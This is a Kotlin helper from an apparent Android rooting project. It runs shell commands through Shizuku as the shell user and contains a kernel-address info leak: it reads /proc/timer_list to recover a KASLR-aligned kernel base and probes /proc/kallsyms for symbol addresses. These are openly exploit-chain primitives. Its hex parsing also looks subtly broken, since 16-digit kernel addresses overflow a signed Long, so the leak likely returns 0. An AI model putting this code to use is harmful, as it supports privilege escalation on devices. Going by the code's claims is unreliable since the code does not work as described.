package com.zero.honorroot

import android.content.pm.PackageManager
import rikka.shizuku.Shizuku

object ShizukuHelper {

    fun isAvailable(): Boolean = runCatching {
        Shizuku.pingBinder()
    }.getOrDefault(false)

    fun hasPermission(): Boolean = runCatching {
        Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
    }.getOrDefault(false)

    fun requestPermission(code: Int) {
        Shizuku.requestPermission(code)
    }

    /**
     * Run shell command via Shizuku and return stdout.
     * Runs as uid=2000 (shell) — higher than app uid.
     */
    fun exec(cmd: String): String = runCatching {
        val process = Shizuku.newProcess(
            arrayOf("sh", "-c", cmd), null, null
        )
        val out = process.inputStream.bufferedReader().readText()
        process.waitFor()
        out
    }.getOrDefault("")

    /**
     * Read /proc/timer_list via shell — leaks kernel .text VAs.
     * Returns first kernel address found, 0 if none.
     */
    fun leakKernelBase(): Long {
        if (!isAvailable() || !hasPermission()) return 0L

        val output = exec("cat /proc/timer_list 2>/dev/null")
        // Look for hex values in kernel VA range (0xffffffc0xxxxxxxx)
        val regex = Regex("(ffffff[c-f][0-9a-f]{9})")
        val match = regex.find(output) ?: return 0L
        val addr = match.value.toLongOrNull(16) ?: return 0L

        // Align down to 2MB KASLR boundary to get near _text
        val aligned = addr and (0x200000L - 1).inv()
        return aligned
    }

    /**
     * Read /proc/kallsyms as shell — still zeroed on Android 13
     * but worth trying in case device has relaxed kptr_restrict.
     */
    fun readKallsyms(symbol: String): Long {
        if (!isAvailable() || !hasPermission()) return 0L
        val out = exec("grep \" $symbol\$\" /proc/kallsyms 2>/dev/null")
        return out.trim().split(" ").firstOrNull()?.toLongOrNull(16) ?: 0L
    }
}
